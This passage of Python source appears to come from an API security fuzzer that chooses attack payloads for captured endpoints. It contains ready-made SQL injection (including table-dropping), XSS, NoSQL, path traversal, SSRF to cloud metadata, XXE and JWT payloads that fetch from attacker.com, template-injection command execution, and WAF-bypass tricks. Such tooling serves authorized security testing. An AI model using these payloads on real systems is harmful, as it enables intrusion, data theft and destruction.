                "deadbeef-dead-beef-dead-beefdeadbeef",
                "12345678-1234-5678-1234-567812345678",
            ]
        if param_type == "objectid":
            return [
                "000000000000000000000000",
                "111111111111111111111111",
                "507f1f77bcf86cd799439011",
                "aaaaaaaaaaaaaaaaaaaaaaaa",
                "ffffffffffffffffffffffff",
            ]
        return [
            "1","2","3","10","100","1000","9999","99999","0","-1","-999",
            "2147483647","-2147483648","4294967295","9223372036854775807",
            "admin","root","test","user","guest","administrator","system",
            "me","self","current","../","..%2f","..%252f","....//","..;/",
            "%2e%2e%2f","..\\..\\\\","null","undefined","NaN","Infinity",
            "*","%","$","_","true","false","yes","no","[]","{}","''",
            '""',"()","1.0","1e10","0x1","0o1","1;--","1'--","1/*",
        ]

    def _get_bola_techniques(self):
        return {
            "horizontal": [
                "Swap user IDs",
                "Enumerate sequential IDs",
                "Guess common usernames",
            ],
            "vertical": [
                "Escalate to admin ID",
                "Access system resources",
                "Modify role parameters",
            ],
            "wildcard": [
                "Use * or % wildcards",
                "Empty/null ID",
                "Array injection [1,2,3]",
            ],
            "guid_attack": [
                "Brute force GUIDs",
                "Predict v1 UUIDs (timestamp-based)",
                "Try common test GUIDs",
            ],
            "path_manipulation": [
                "../admin/resource",
                "../../other_user",
                "Absolute paths /api/admin/1",
            ],
            "parameter_pollution": [
                "id=1&id=2",
                "user_id=victim&user_id=attacker",
                "Duplicate params",
            ],
            "method_override": [
                "X-HTTP-Method-Override: PUT",
                "Change GET to POST",
                "OPTIONS to bypass",
            ],
            "encoding": ["URL encode IDs", "Double encode", "Unicode normalization"],
            "type_confusion": ["String to int", "Array to object", "JSON to XML"],
            "batch_requests": [
                "GraphQL batching",
                "JSON array of IDs",
                "Bulk operations",
            ],
        }

    def _get_race_condition_payloads(self):
        return {
            "techniques": [
                "Parallel requests",
                "Turbo Intruder",
                "Single-packet attack",
            ],
            "targets": [
                "Coupon redemption",
                "Balance deduction",
                "Inventory check",
                "Rate limits",
            ],
            "timing": [
                "Send 20+ simultaneous requests",
                "Use connection warming",
                "HTTP/2 single-packet",
            ],
        }

    def _get_graphql_attacks(self):
        return {
            "introspection": [
                "query{__schema{types{name,fields{name}}}}",
                "query{__schema{queryType{name,fields{name,args{name,type{name}}}}}}",
                "query{__schema{mutationType{name,fields{name}}}}",
                "query{__type(name:\"Query\"){fields{name}}}",
                "{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}",
            ],
            "batching": [
                "[{query:user(id:1)},{query:user(id:2)}]",
                "[{\"query\":\"query{user(id:1)}\"},{\"query\":\"query{user(id:2)}\"}]",
            ],
            "depth": [
                "query{user{posts{comments{replies{replies{replies}}}}}}",
                "query{user{friends{friends{friends{friends{friends{friends}}}}}}}",
                "query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z}}}}}}}}}}}}}}}}}}}}}}}}}}",
            ],
            "aliases": [
                "query{u1:user(id:1) u2:user(id:2) u3:user(id:3)}",
                "query{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename}",
                "query{q1:users q2:users q3:users q4:users q5:users q6:users q7:users q8:users q9:users q10:users}",
            ],
            "mutations": [
                "mutation{deleteUser(id:1)}",
                "mutation{updateRole(id:1,role:admin)}",
                "mutation{createUser(username:\"admin\",role:\"admin\")}",
                "mutation{updateUser(id:1,email:\"attacker@evil.com\")}",
            ],
            "field_suggestion": [
                "query{__schema{directive}}",
                "query{usre{id,name}}",
                "query{admn{id,role}}",
                "query{passwrd}",
            ],
            "directive_overload": [
                "query{__typename @a@a@a@a@a@a@a@a@a@a}",
                "query{user(id:1)@skip(if:true)@skip(if:true)@skip(if:true)}",
                "query{users @include(if:true)@include(if:true)@include(if:true)}",
            ],
            "circular_fragment": [
                "query{...A} fragment A on User{friends{...A}}}",
                "query{...F1} fragment F1 on Query{...F2} fragment F2 on Query{...F1}",
            ],
            "array_batching": [
                "[{\"query\":\"query{__typename}\"},{\"query\":\"query{__typename}\"},{\"query\":\"query{__typename}\"}]",
            ],
        }

    def _get_jwt_attacks(self):
        return {
            "alg_confusion": [
                "alg:none",
                "alg:HS256 with RSA key",
                "alg:None",
                "alg:nOnE",
            ],
            "kid_injection": [
                "kid:/etc/passwd",
                "kid:../../key",
                "kid:http://attacker.com/key",
            ],
            "jku_jti": ["jku:http://attacker.com/jwks.json", "jti:null"],
            "claims": ["exp:9999999999", "iat:-1", "nbf:0", "sub:admin", "role:admin"],
            "signature": [
                "Empty signature",
                "Null byte in signature",
                "Strip signature",
            ],
        }

    def _get_api_abuse_vectors(self):
        return {
            "rate_limit_bypass": [
                "X-Forwarded-For rotation",
                "User-Agent rotation",
                "Multiple API keys",
            ],
            "cache_poisoning": ["X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL"],
            "smuggling": [
                "Content-Length vs Transfer-Encoding",
                "CL.TE",
                "TE.CL",
                "TE.TE",
            ],
            "desync": ["HTTP/2 downgrade", "Connection reuse", "Pipeline abuse"],
            "prototype_pollution": [
                "__proto__",
                "constructor.prototype",
                "Object.prototype",
            ],
        }

    def _get_business_logic_tests(self):
        return {
            "price_manipulation": ["-1", "0", "0.01", "999999999", "1e10"],
            "quantity_abuse": ["-1", "0", "999999", "2147483647"],
            "workflow_bypass": [
                "Skip payment step",
                "Direct checkout",
                "Replay old state",
            ],
            "time_manipulation": ["Future dates", "Past dates", "Timezone abuse"],
            "currency_confusion": ["USD to cents", "EUR to USD", "Negative amounts"],
        }

    def _get_sqli_payloads(self):
        return [
            "'","''","\"","\"\"","`","``",
            "' OR '1'='1","' OR 1=1--","' OR 'a'='a","\" OR \"1\"=\"1",
            "' OR '1'='1'--","' OR '1'='1'/*","' OR '1'='1'#",
            "1' OR '1'='1","1' OR 1=1--","admin' OR '1'='1","admin'--",
            "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
            "' UNION ALL SELECT NULL--","' UNION SELECT @@version--",
            "'; WAITFOR DELAY '0:0:5'--","'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--","1' AND SLEEP(5)#","')","))",")))",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "'; DROP TABLE users--","' ORDER BY 1--","' ORDER BY 10--",
            "admin'#","admin'/*","admin' OR 1=1#",
            "' AND '1'='1","' AND '1'='2","1' AND '1'='1","1' AND '1'='2",
            "' OR 1=1 LIMIT 1--","' OR 1=1 LIMIT 1#","' OR 1=1 LIMIT 1/*",
            "' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,2,3--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
            "' AND 1=CAST(@@version AS INT)--",
            "'; EXEC sp_MSforeachtable 'DROP TABLE ?'--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
            "1' AND '1'='1' AND '1'='1","1' AND '1'='2' OR '1'='1",
            "\\' OR 1=1--","\\\\' OR 1=1--","' OR 'x'='x","') OR ('x'='x",
            "')) OR (('x'='x","'))) OR ((('x'='x",
            "' OR username IS NOT NULL--","' OR 1=1%00","' OR 1=1;%00",
            "admin' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
            "' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'||(SELECT SLEEP(5))||'","'+(SELECT SLEEP(5))+'",'"+(SELECT 0 WHERE 0 LIKE 0)+"',
        ]

    def _get_xss_payloads(self):
        return [
            "<script>alert(1)</script>","<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)>","<svg onload=alert(1)>",
            "<body onload=alert(1)>","<input onfocus=alert(1) autofocus>",
            "'><script>alert(1)</script>","\"><script>alert(1)</script>",
            "</script><script>alert(1)</script>","</title><script>alert(1)</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}",
            "{{constructor.constructor('alert(1)')()}}",
            "javascript:alert(1)","javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "<svg><script>alert(1)</script></svg>",
            "<iframe src=javascript:alert(1)>",
            "<img src=x onerror=\"alert(1)\">","<svg/onload=alert(1)>",
            "<img src=x onerror=alert`1`>","<svg onload=alert`1`>",
            "<img src=x onerror=\\u0061lert(1)>",
            "<img src=x onerror=\\x61lert(1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<details open ontoggle=alert(1)>","<marquee onstart=alert(1)>",
            "<video src=x onerror=alert(1)>","<audio src=x onerror=alert(1)>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<body onpageshow=alert(1)>","<body onhashchange=alert(1)>",
            "<svg><animate onbegin=alert(1)>","<svg><set onbegin=alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<form action=javascript:alert(1)><input type=submit>",
            "<isindex action=javascript:alert(1) type=submit>",
            "<math><mi xlink:href=javascript:alert(1)>click",
            "<svg><a xlink:href=javascript:alert(1)><text x=0 y=20>XSS</text></a></svg>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "<img src=x:alert(1) onerror=eval(src)>",
            "<img src=x onerror=this.src='javascript:alert(1)'>",
            "<img src=x onerror=Function`a${'alert(1)'}a`()>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
            "<base href=javascript:alert(1)//>",
            "<link rel=import href=data:text/html,<script>alert(1)</script>>",
            "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
            "<style>@import'javascript:alert(1)';</style>",
            "<style>*{background:url('javascript:alert(1)')}</style>",
            "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
            "<xss onclick=alert(1)>click","<xss onmouseover=alert(1)>hover",
            "'-alert(1)-'",'"-alert(1)-"',"javascript:alert(1)//",
            "<script>alert(1)//","<script>alert(1)<!--","<script>alert(1)</script",
            "<ScRiPt>alert(1)</sCrIpT>","<script>al\u0065rt(1)</script>",
            "<script>al\x65rt(1)</script>","<script>\u0061lert(1)</script>",
        ]

    def _get_nosqli_payloads(self):
        return [
            "{'$gt':''}","{'$ne':null}","{'$regex':'.*'}","{'$exists':true}",
            "{'$nin':[]}","{'$or':[{},{'a':'a'}]}","[$ne]=1","[$gt]=",
            "[$regex]=.*","[$exists]=true","[$or][0][admin]=1","[$where]=1",
            '{"$where":"1==1"}','{"$where":"return true"}',
            '{"$where":"this.password.match(/.*/)"}',
            "{'username':{'$regex':'^admin'}}","{'password':{'$regex':'.*'}}",
            "{'username':{'$type':2}}","{'password':{'$type':1}}",
            "{'$gt':0}","{'$gte':0}","{'$lt':999999}","{'$lte':999999}",
            "{'$in':['admin','root']}","{'$nin':['']}",
            "{'$not':{'$eq':''}}","{'$nor':[{'a':1}]}",
            "[$ne]=","[$gt]=0","[$gte]=0","[$lt]=999999","[$nin][]=",
            "[$in][]=admin","[$in][]=root","[$regex]=^.*$","[$options]=i",
            '{"$where":"sleep(5000)"}','{"$where":"return sleep(5000)"}',
            "{'$expr':{'$eq':['$password','$password']}}",
            "{'$jsonSchema':{}}","{'$text':{'$search':'admin'}}",
            "{'$mod':[2,0]}","{'$all':[]}","{'$elemMatch':{}}",
            "{'$size':0}","{'$bitsAllSet':0}","{'$comment':'injection'}",
            "username[$ne]=invalid&password[$ne]=invalid",
            "username[$regex]=.*&password[$regex]=.*",
            "username[$gt]=&password[$gt]=",
            "login[$regex]=a.*&pass[$ne]=1",
            "{'username':{'$ne':''},'password':{'$ne':''}}",
            "{'$or':[{'username':'admin'},{'username':'root'}]}",
            "{'$and':[{'$or':[{'username':'admin'}]},{'$or':[{'password':{'$ne':''}}]}]}",
        ]

    def _get_path_traversal_payloads(self):
        return [
            # Basic
            "../",
            "..%2f",
            "..\\",
            "..%5c",
            "..;",
            # Multiple levels
            "../../",
            "../../../",
            "../../../../",
            "../../etc/passwd",
            "../../../etc/passwd",
            # Encoded
            "..%2f..%2f",
            "..%252f..%252f",
            "..%c0%af..%c0%af",
            # Double encoding
            "..%252f..%252fetc%252fpasswd",
            # Bypass filters
            "....//....//",
            "..../..../",
            "....\\....\\",
            # Absolute paths
            "/etc/passwd",
            "/etc/shadow",
            "/windows/win.ini",
            "C:\\windows\\win.ini",
            "C:/windows/win.ini",
            # Null byte
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            # Wrappers
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
        ]

    def _get_ssrf_payloads(self):
        return [
            # Internal IPs
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://[::ffff:127.0.0.1]",
            # Private networks
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            # Bypass filters
            "http://127.1",
            "http://0x7f.0x0.0x0.0x1",
            "http://2130706433",
            "http://127.0.0.1.nip.io",
            "http://127.0.0.1.xip.io",
            # DNS rebinding
            "http://spoofed.burpcollaborator.net",
            # File protocol
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]

    def _get_xxe_payloads(self):
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
        ]

    def _get_ssti_payloads(self):
        return [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config}}",
            "{{self}}",
            "${applicationScope}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "*{7*7}",
            "@{7*7}",
            "~{7*7}",
        ]

    def _get_deserialization_payloads(self):
        return [
            'O:8:"stdClass":0:{}',
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
            '{"@type":"java.net.Inet4Address","val":"attacker.com"}',
            "aced0005737200",
            "YToxOntzOjM6XCJmb29cIjtzOjM6XCJiYXJcIjt9",
        ]

    # ============================================================================
    # WAF BYPASS PAYLOADS - NAVIGATION: Search "WAF BYPASS" to jump here
    # ============================================================================

    def _get_waf_bypass_headers(self):
        """Header-based WAF bypass (IP spoofing, host manipulation, smuggling)"""
        return [
            # IP spoofing (basic)
            "X-Forwarded-For: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
            "X-Remote-Addr: 127.0.0.1",
            "X-Client-IP: 127.0.0.1",
            "Client-IP: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "True-Client-IP: 127.0.0.1",
            # Advanced IP spoofing
            "X-Forwarded-For: 127.0.0.1, 127.0.0.1",  # Multiple IPs
            "X-Forwarded-For: localhost",  # Hostname instead of IP
            "X-Forwarded-For: [::1]",  # IPv6 localhost
            "X-Forwarded-For: 0.0.0.0",  # Wildcard IP
            # Host manipulation
            "X-Host: 127.0.0.1",
            "X-Forwarded-Host: 127.0.0.1",
            "X-Forwarded-Host: localhost",
            # URL rewriting
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Custom-IP-Authorization: 127.0.0.1",
            # Protocol manipulation
            "X-Forwarded-Proto: https",
            "X-Forwarded-Scheme: https",
            "Front-End-Https: on",
            # Cache poisoning
            "X-Forwarded-Host: evil.com",
            "X-Host: evil.com",
            # Request smuggling helpers
            "Transfer-Encoding: chunked",
            "Content-Length: 0",
        ]

    def _get_waf_bypass_encoding(self):
        """Encoding bypass (URL/Unicode/Hex/HTML entities, case variation)"""
        return {
            # Single URL encoding
            "url_encode": ["%27", "%3C", "%3E", "%22", "%2F", "%20", "%3B", "%28", "%29"],
            # Double URL encoding (bypasses single decode)
            "double_encode": ["%2527", "%253C", "%253E", "%2522", "%252F"],
            # Triple encoding (for aggressive WAFs)
            "triple_encode": ["%25252527", "%2525253C"],
            # Unicode encoding
            "unicode": ["\\u0027", "\\u003c", "\\u003e", "\\u0022", "\\u002f"],
            # Unicode overlong encoding
            "unicode_overlong": ["\\u00027", "\\u0003c"],
            # Hex encoding
            "hex": ["\\x27", "\\x3c", "\\x3e", "\\x22", "\\x2f"],
            # Octal encoding
            "octal": ["\\047", "\\074", "\\076"],
            # HTML entity encoding
            "html_entity": ["&#39;", "&#60;", "&#62;", "&lt;", "&gt;", "&quot;"],
            # Mixed case (bypasses case-sensitive rules)
            "mixed_case": ["<ScRiPt>", "SeLeCt", "UnIoN", "oR", "AnD", "WhErE"],
            # UTF-7 encoding
            "utf7": ["+ADw-script+AD4-", "+ADw-img src+AD0-x+AD4-"],
            # Null byte injection
            "null_byte": ["%00", "\\x00", "\\0"],
            # Newline/tab injection
            "whitespace": ["%0a", "%0d", "%09", "\\n", "\\r", "\\t"],
        }

    def _get_waf_bypass_http_methods(self):
        """HTTP method manipulation (override headers, verb tampering)"""
        return {
            # Method override headers
            "method_override_headers": [
                "X-HTTP-Method-Override: PUT",
                "X-HTTP-Method-Override: DELETE",
                "X-HTTP-Method-Override: PATCH",
                "X-Method-Override: PUT",
                "X-Method-Override: DELETE",
                "_method=PUT",  # Query parameter
                "_method=DELETE",
            ],
            # Case variations (bypass case-sensitive filters)
            "case_variations": ["GeT", "PoSt", "pUt", "DeLeTe", "PaTcH", "OpTiOnS"],
            # Verb tampering (uncommon methods)
            "verb_tampering": ["TRACE", "TRACK", "DEBUG", "CONNECT", "PROPFIND", "PROPPATCH"],
            # Arbitrary methods
            "arbitrary_methods": ["HACK", "ADMIN", "TEST", "CUSTOM"],
            # Whitespace injection
            "whitespace_methods": ["GET ", " GET", "GET\\t", "GET\\n"],
        }

    def _get_waf_bypass_path_tricks(self):
        """Path manipulation (dot encoding, null bytes, Unicode tricks)"""
        return [
            # Basic path pollution
            "//",
            "/.//",
            "/./",
            # Encoded dots
            "/%2e/",
            "/%2e%2e/",
            "/%252e/",  # Double encoded
            # Semicolon tricks
            "/;/",
            "/;foo=bar/",
            "/..;/",
            "/.;/",
            # Null byte injection
            "/%00/",
            "/%00.html",
            # Newline/tab injection
            "/%0a/",
            "/%0d/",
            "/%09/",
            # Backslash (Windows)
            "/\\/",
            "/..\\../",
            # Unicode normalization
            "/\\u002e\\u002e/",
            # Question mark trick
            "/?/",
            "/#/",
            # Multiple slashes
            "///",
            "////",
            # Dot variations
            "/...//",
            "/..../",
        ]

    def _get_waf_bypass_content_type(self):
        """Content-Type manipulation (charset variations, boundary tricks)"""
        return [
            # Standard types
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
            "application/json",
            "application/json; charset=utf-8",
            "application/xml",
            "text/xml",
            # Charset variations
            "application/json; charset=iso-8859-1",
            "application/json; charset=utf-16",
            "application/json; charset=utf-32",
            # Case variations
            "Application/Json",
            "APPLICATION/JSON",
            "application/JSON",
            # With boundary (multipart)
            "multipart/form-data; boundary=----WebKitFormBoundary",
            # Uncommon types
            "application/octet-stream",
            "application/x-amf",
            "text/html",
            # Empty/null
            "",
            "null",
        ]

    # ============================================================================
    # DATA ACCESS HELPERS - NAVIGATION: Search "DATA ACCESS" to jump here
    # ============================================================================

    def _get_entry(self, entries):
        """Get single entry from list or dict - handles both capture and import"""
        if isinstance(entries, list):
            return entries[0] if entries else {}
        return entries

    # ============================================================================
    # FUZZER CORE LOGIC - NAVIGATION: Search "FUZZER CORE" to jump here
    # ============================================================================

    def _normalize_endpoint_data(self, entry):
        """Normalize endpoint data to consistent format"""
        params = entry.get("parameters", {})
        param_patterns = entry.get("param_patterns", {})

        return {
            "path": entry["normalized_path"],
            "method": entry["method"],
            "host": self._ascii_safe(entry.get("host"), lower=True).strip(),
            "protocol": self._ascii_safe(entry.get("protocol"), lower=True).strip()
            or "https",
            "auth": entry.get("auth_detected", []),
            "params": {
                "url": self._normalize_param_list(params.get("url", [])),
                "body": self._normalize_param_list(params.get("body", [])),
                "json": self._normalize_param_list(params.get("json", [])),
                "cookie": self._normalize_param_list(params.get("cookie", [])),
            },
            "reflected": (
                param_patterns.get("reflected", [])
                if isinstance(param_patterns, dict)
                else []
            ),
            "content_type": entry.get("content_type", ""),
            "response_status": entry.get("response_status", 200),
            "response_body": entry.get("response_body", ""),
        }

    def _normalize_param_list(self, param_data):
        """Convert params to list format (handles dict or list)"""
        if isinstance(param_data, dict):
            return list(param_data.keys())
        elif isinstance(param_data, list):
            return param_data
        return []

    def _attack_selected(self, attack_type, aliases):
        """Match selected attack mode while keeping `All` as a superset."""
        selected = (attack_type or "").strip().lower()
        if selected == "all":
            return True
        for alias in aliases:
            if selected == str(alias).strip().lower():
                return True
        return False

    def _fuzzer_has_api_signal(self, normalized, include_write_method=False):
        """Check whether endpoint looks like an API target (not generic frontend traffic)."""
        method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
        path = self._ascii_safe(normalized.get("path") or "/", lower=True).strip()
        content_type = self._ascii_safe(normalized.get("content_type"), lower=True).strip()
        has_api_marker = bool(
            "/api/" in path
            or "/graphql" in path
            or "/rest/" in path
            or "/openapi" in path
            or "/swagger" in path
            or "/metadata/" in path
            or "/oauth" in path
            or "/auth/" in path
            or re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path)
        )
        has_structured_content = bool(
            (
                "json" in content_type
                or "xml" in content_type
                or "protobuf" in content_type
                or "x-www-form-urlencoded" in content_type
                or "multipart/form-data" in content_type
            )
            and "javascript" not in content_type
            and "html" not in content_type
        )
        if include_write_method and method in ["POST", "PUT", "PATCH", "DELETE"]:
            return True
        return has_api_marker or has_structured_content

    def _fuzzer_has_object_target(self, normalized):
        """Check for object/resource targeting hints for auth/BOLA style tests."""
        path = self._ascii_safe(normalized.get("path") or "/", lower=True)
        if any(x in path for x in ["{id}", "{uuid}", "{objectid}"]):
            return True
        if self.NUMERIC_ID_PATTERN.search(path):
            return True
        if self.UUID_PATTERN.search(path):
            return True
        if self.OBJECTID_PATTERN.search(path):
            return True
        params = normalized.get("params", {})
        param_names = (
            list(params.get("url", []))
            + list(params.get("body", []))
            + list(params.get("json", []))
        )
        for name in [self._ascii_safe(x, lower=True) for x in param_names]:
            if any(token in name for token in ["id", "uuid", "object", "user", "account"]):
                return True
        return False

    def _check_idor(self, normalized, attack_type):
        """Check if endpoint is vulnerable to IDOR - verify ID params are used"""
        if not self._attack_selected(attack_type, ["BOLA", "IDOR"]):
            return None
        path = normalized["path"]
        if "{id}" not in path and "{uuid}" not in path and "{objectid}" not in path:
            return None
        
        # Verify ID parameters are actually present in URL params
        params = normalized["params"]
        has_id_param = any(
            "id" in str(p).lower() for p in params.get("url", [])
        )
        
        # Skip if path has {id} but no actual ID parameter (likely frontend route)
        if not has_id_param and "{id}" in path:
            # Check if it's a REST API pattern (not frontend route)
            if not any(indicator in path.lower() for indicator in ["/api/", "/v1/", "/v2/", "/v3/"]):
                return None

        param_type = "uuid" if "{uuid}" in path else "numeric"
        techniques = self._get_bola_techniques()

        return {
            "type": "IDOR/BOLA",
            "payloads": self._get_idor_payloads(param_type)[:8],
            "techniques": {
                "horizontal": techniques["horizontal"],
                "vertical": techniques["vertical"],
                "wildcard": techniques["wildcard"][:3],
                "encoding": techniques["encoding"],
                "param_pollution": techniques["parameter_pollution"][:2],
            },
            "test": "Horizontal/vertical privilege escalation, wildcard injection, encoding bypass",
            "risk": "Access/modify other users' resources, privilege escalation",
            "note": "Verify endpoint exists (not 404) and requires authentication before testing"
        }

    def _check_bola(self, normalized, attack_type):
        """Check for BOLA-specific attacks on authenticated API-like object targets."""
        if not self._attack_selected(attack_type, ["BOLA"]):
            return None
        if "None" in normalized["auth"]:
            return None
        if not self._fuzzer_has_api_signal(normalized):
            return None
        if not self._fuzzer_has_object_target(normalized):
            return None

        techniques = self._get_bola_techniques()
        method = normalized["method"]

        attacks = []
        if method in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
            attacks.append("Remove Authorization header")
            attacks.append("Use expired/invalid token")
        if "Bearer Token" in normalized["auth"]:
            attacks.extend(
                ["JWT alg:none", "JWT null signature", "JWT kid manipulation"]
            )
        if method in ["PUT", "PATCH", "DELETE"]:
            attacks.extend(techniques["method_override"])

        return {
            "type": "BOLA",
            "attacks": attacks,
            "techniques": {
                "horizontal": techniques["horizontal"],
                "vertical": techniques["vertical"],
                "batch": techniques["batch_requests"],
                "type_confusion": techniques["type_confusion"],
            },
            "test": "Test all authenticated endpoints for broken object level authorization",
            "risk": "Unauthorized access to resources belonging to other users",
            "auth_required": True,
            "note": "[!] REQUIRES AUTHENTICATION: Capture authenticated traffic first or provide valid tokens"
        }

    def _check_auth_bypass(self, normalized, attack_type):
        """Check auth bypass potential for authenticated API-like object targets."""
        if not self._attack_selected(attack_type, ["Auth Bypass"]):
            return None
        if "None" in normalized["auth"]:
            return None
        if not self._fuzzer_has_api_signal(normalized):
            return None
        if not self._fuzzer_has_object_target(normalized):
            return None
        details = ["Remove auth, invalid tokens, expired tokens"]
        if "Bearer Token" in normalized["auth"]:
            details.append("JWT: alg:none, weak secret, expired token")
        if "Session Cookie" in normalized["auth"]:
            details.append("Cookie: Tamper session ID, fixation, hijacking")
        return {
            "type": "Auth Bypass",
            "details": details,
            "risk": "Unauthorized access",
            "auth_required": True,
            "note": "[!] REQUIRES AUTHENTICATION: Test with valid credentials first"
        }

    def _check_sqli(self, normalized, attack_type):
        """Check SQLi potential with API + parameter + route semantics."""
        if not self._attack_selected(attack_type, ["SQLi", "SQL Injection"]):
            return None
        if not self._fuzzer_has_api_signal(normalized):
            return None
        params = normalized["params"]
        candidate_params = list(params.get("url", [])) + list(params.get("body", [])) + list(
            params.get("json", [])
        )
        if not candidate_params:
            return None

        candidate_params_lower = [self._ascii_safe(x, lower=True) for x in candidate_params]
        sqli_params = []
        for idx, name in enumerate(candidate_params_lower):
            if any(keyword in name for keyword in self.FUZZER_SQLI_PARAM_KEYWORDS):
                sqli_params.append(candidate_params[idx])
        if not sqli_params:
            return None

        # Require route semantics that suggest server-side querying
        path = normalized["path"].lower()
        likely_db_query = any(
            indicator in path for indicator in [
                "search", "query", "filter", "find", "list", "lookup", "report", "user", "account"
            ]
        )
        if not likely_db_query:
            return None

        return {
            "type": "SQL Injection",
            "params": sqli_params[:5],
            "payloads": self._get_sqli_payloads()[:5],
            "risk": "Database compromise",
            "confidence": "High",
            "note": "Test for actual SQL errors in response before confirming vulnerability"
        }

    def _check_xss(self, normalized, attack_type):
        """Check if endpoint has XSS potential - only for HTML responses"""
        if not self._attack_selected(attack_type, ["XSS"]):
            return None
        if not normalized["reflected"]:
            return None
        # Only flag XSS for HTML responses (not JSON APIs)
        content_type = normalized["content_type"].lower()
        if "json" in content_type or "xml" in content_type:
            return None
        if "html" not in content_type and "text/plain" not in content_type:
            return None
        return {
            "type": "XSS",
            "reflected": normalized["reflected"],
            "payloads": self._get_xss_payloads()[:4],
            "risk": "Client-side code execution",
            "note": "HTML context detected - reflection in JSON APIs is not XSS"
        }

    def _check_ssrf(self, normalized, attack_type):
        """Check for SSRF candidates using path/parameter hints."""
        if not self._attack_selected(attack_type, ["SSRF"]):
            return None
        if not self._fuzzer_has_api_signal(normalized):
            return None
        params = normalized["params"]
        candidate_params = list(params.get("url", [])) + list(params.get("body", [])) + list(
            params.get("json", [])
        )
        candidate_params_lower = [self._ascii_safe(x, lower=True) for x in candidate_params]
        path = normalized["path"].lower()
        ssrf_params = []
        for idx, name in enumerate(candidate_params_lower):
            if any(keyword in name for keyword in self.FUZZER_SSRF_PARAM_KEYWORDS):
                ssrf_params.append(candidate_params[idx])
        path_hits = any(
            marker in path
            for marker in ["/proxy", "/fetch", "/webhook", "/import", "/redirect", "/url"]
        )
        if not ssrf_params:
            return None
        method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
        if (not path_hits) and method not in ["POST", "PUT", "PATCH"]:
            return None
        return {
            "type": "SSRF",
            "params": ssrf_params[:6],
            "payloads": self._get_ssrf_payloads()[:6],
            "test": "Probe internal hosts, metadata endpoints, and protocol confusion",
            "risk": "Internal network access, metadata theft, and pivoting",
            "note": "Prefer Burp Collaborator/internal canary targets for safe validation",
        }

    def _check_xxe(self, normalized, attack_type):
        """Check for XML/XXE candidates from content type, path, and parameter hints."""
        if not self._attack_selected(attack_type, ["XXE"]):
            return None
        content_type = normalized["content_type"].lower()
        path = normalized["path"].lower()
        params = normalized["params"]
        body_like_params = list(params.get("body", [])) + list(params.get("json", []))
        body_like_lower = [str(x).lower() for x in body_like_params]
        xml_hints = (
            "xml" in content_type
            or "soap" in content_type
            or any(marker in path for marker in ["/xml", "/soap", "/saml"])
            or any(
                any(keyword in name for keyword in ["xml", "soap", "saml", "payload", "doctype", "svg"])
                for name in body_like_lower
            )
        )
        if not xml_hints:
            return None
        return {
            "type": "XXE",
            "params": body_like_params[:6],
            "payloads": self._get_xxe_payloads()[:4],
            "test": "External entity resolution, file disclosure, and blind XXE callbacks",
            "risk": "Sensitive file access, SSRF via parser, and parser DoS",
            "note": "Only test XXE against endpoints that accept XML payloads",
        }

